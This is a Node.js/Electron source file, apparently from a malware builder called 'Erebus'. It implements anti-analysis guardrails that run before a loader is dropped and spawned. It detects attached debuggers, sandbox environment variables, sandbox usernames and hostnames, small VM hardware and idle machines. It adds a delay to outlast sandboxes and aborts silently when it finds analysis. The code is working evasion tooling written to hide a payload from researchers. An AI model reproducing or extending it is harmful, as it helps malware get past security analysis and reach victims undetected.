// Pure-Node anti-analysis guardrails for the Erebus Electron wrapper.
//
// These run in the Electron main process BEFORE any loader files are
// copied to the temp directory or the spawn occurs. If any enabled check
// fails, runGuardrails() returns { ok: false, reason: <string> } and the
// caller must abort the installer:run handler silently — no files are
// written, no process is spawned, no visible error is shown.
//
// Every check is individually toggleable via the config.GUARDRAILS block
// that the Erebus builder renders into src/config.js at build time. The
// renderer-side (wizard.js) also enforces a dwell time + mouse-movement
// gate before the IPC handler is even invoked.

const os = require('os');
const { powerMonitor, screen } = require('electron');

function _lc(s) { return String(s || '').trim().toLowerCase(); }
function _list(v) {
  if (!v) return [];
  if (Array.isArray(v)) return v.map(_lc).filter(Boolean);
  return String(v).split(',').map(_lc).filter(Boolean);
}

function checkDebugger() {
  // process.execArgv contains --inspect/--inspect-brk when Node is launched
  // under a debugger; process.debugPort is non-zero when the inspector is
  // attached. Either one is a strong signal that a researcher is looking.
  const args = (process.execArgv || []).join(' ').toLowerCase();
  if (args.includes('--inspect') || args.includes('--debug')) {
    return 'node-inspector-arg';
  }
  if (process.debugPort && process.debugPort > 0) {
    return 'debug-port-open';
  }
  try {
    const inspector = require('inspector');
    if (inspector.url && inspector.url()) return 'inspector-attached';
  } catch (_) { /* inspector module unavailable — fine */ }
  return null;
}

function checkHostnameWhitelist(list) {
  if (!list || list.length === 0) return null;
  const host = _lc(os.hostname());
  if (!list.some((h) => host === h || host.endsWith('.' + h))) {
    return `hostname-not-whitelisted:${host}`;
  }
  return null;
}

function checkHostnameBlocklist(list) {
  if (!list || list.length === 0) return null;
  const host = _lc(os.hostname());
  for (const h of list) {
    if (host === h || host.includes(h)) return `hostname-blocklisted:${host}`;
  }
  return null;
}

function checkUsernameWhitelist(list) {
  if (!list || list.length === 0) return null;
  const user = _lc(os.userInfo().username);
  if (!list.includes(user)) return `username-not-whitelisted:${user}`;
  return null;
}

function checkUsernameBlocklist(list) {
  if (!list || list.length === 0) return null;
  const user = _lc(os.userInfo().username);
  if (list.includes(user)) return `username-blocklisted:${user}`;
  return null;
}

// Common sandbox / analysis usernames baked into generic detonation VMs.
const DEFAULT_BAD_USERNAMES = [
  'sandbox', 'malware', 'maltest', 'test', 'tester', 'analyst', 'virus',
  'sample', 'currentuser', 'user', 'admin', 'wdagutilityaccount',
];

// Common sandbox / analysis hostnames.
const DEFAULT_BAD_HOSTNAMES = [
  'sandbox', 'malware', 'analyst', 'cuckoo', 'hybrid-analysis',
  'vm', 'virtual', 'vbox', 'qemu',
];

function checkDefaultBadUsernames() {
  const user = _lc(os.userInfo().username);
  for (const bad of DEFAULT_BAD_USERNAMES) {
    if (user === bad || user.startsWith(bad)) return `default-bad-username:${user}`;
  }
  return null;
}

function checkDefaultBadHostnames() {
  const host = _lc(os.hostname());
  for (const bad of DEFAULT_BAD_HOSTNAMES) {
    if (host.includes(bad)) return `default-bad-hostname:${host}`;
  }
  return null;
}

function checkMinScreenSize(minWidth, minHeight) {
  if (!minWidth && !minHeight) return null;
  try {
    const primary = screen.getPrimaryDisplay();
    const { width, height } = primary.workAreaSize;
    if (minWidth && width < minWidth) {
      return `screen-too-small:${width}x${height}`;
    }
    if (minHeight && height < minHeight) {
      return `screen-too-small:${width}x${height}`;
    }
  } catch (_) { /* no display manager (headless) → suspicious */
    return 'no-display-manager';
  }
  return null;
}

function checkMinCpuCount(minCpus) {
  if (!minCpus) return null;
  const cpus = os.cpus() || [];
  if (cpus.length < minCpus) return `too-few-cpus:${cpus.length}`;
  return null;
}

function checkMinMemory(minBytes) {
  if (!minBytes) return null;
  const total = os.totalmem();
  if (total < minBytes) return `too-little-ram:${total}`;
  return null;
}

function checkMaxIdleTime(maxSeconds) {
  if (!maxSeconds) return null;
  try {
    const idle = powerMonitor.getSystemIdleTime();
    if (idle > maxSeconds) return `idle-too-long:${idle}s`;
  } catch (_) { /* fall through */ }
  return null;
}

function checkSandboxEnvVars() {
  // Env vars left by well-known sandbox / analysis frameworks.
  const indicators = [
    'SBIEHOME',          // Sandboxie
    'SANDBOXIE_CURRENT_DIR',
    'CUCKOO_AGENT',      // Cuckoo Sandbox agent
    'JOEBOX_AGENT',      // Joe Sandbox
    'ANALYST_USERNAME',
  ];
  for (const key of indicators) {
    if (process.env[key]) return `sandbox-env:${key}`;
  }
  return null;
}

// ---------------------------------------------------------------------------
// Runner
// ---------------------------------------------------------------------------

async function runGuardrails(gr) {
  if (!gr || !gr.enabled) return { ok: true };

  const reasons = [];
  const failFast = (reason) => { if (reason) reasons.push(reason); };

  if (gr.checkDebugger) failFast(checkDebugger());
  if (gr.checkSandboxEnv) failFast(checkSandboxEnvVars());
  if (gr.checkDefaultBadUsernames) failFast(checkDefaultBadUsernames());
  if (gr.checkDefaultBadHostnames) failFast(checkDefaultBadHostnames());
  failFast(checkHostnameWhitelist(_list(gr.hostnameWhitelist)));
  failFast(checkHostnameBlocklist(_list(gr.hostnameBlocklist)));
  failFast(checkUsernameWhitelist(_list(gr.usernameWhitelist)));
  failFast(checkUsernameBlocklist(_list(gr.usernameBlocklist)));
  if (gr.minScreenWidth || gr.minScreenHeight) {
    failFast(checkMinScreenSize(gr.minScreenWidth, gr.minScreenHeight));
  }
  if (gr.minCpuCount) failFast(checkMinCpuCount(gr.minCpuCount));
  if (gr.minMemoryMb) failFast(checkMinMemory(gr.minMemoryMb * 1024 * 1024));
  if (gr.maxIdleSeconds) failFast(checkMaxIdleTime(gr.maxIdleSeconds));

  // Time-based anti-sandbox delay: sleep for N ms inside the IPC handler
  // so rapid-execution sandboxes time out before reaching the spawn.
  if (gr.preSpawnDelayMs && gr.preSpawnDelayMs > 0) {
    await new Promise((resolve) => setTimeout(resolve, gr.preSpawnDelayMs));
  }

  if (reasons.length > 0) {
    return { ok: false, reason: reasons.join(',') };
  }
  return { ok: true };
}

module.exports = { runGuardrails };
